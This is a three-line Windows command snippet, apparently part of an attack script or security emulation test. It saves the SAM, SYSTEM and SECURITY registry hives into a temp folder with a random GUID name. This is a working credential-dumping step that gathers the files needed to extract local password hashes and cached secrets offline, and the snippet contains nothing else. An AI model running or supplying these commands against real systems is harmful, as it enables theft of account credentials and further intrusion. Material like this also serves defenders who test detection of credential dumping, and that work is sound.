reg save HKLM\SAM $env:temp\f3a4def0-1632-4d84-a99b-7c69233a91b8\SAM
reg save HKLM\SYSTEM $env:temp\f3a4def0-1632-4d84-a99b-7c69233a91b8\SYSTEM
reg save HKLM\SECURITY $env:temp\f3a4def0-1632-4d84-a99b-7c69233a91b8\SECURITY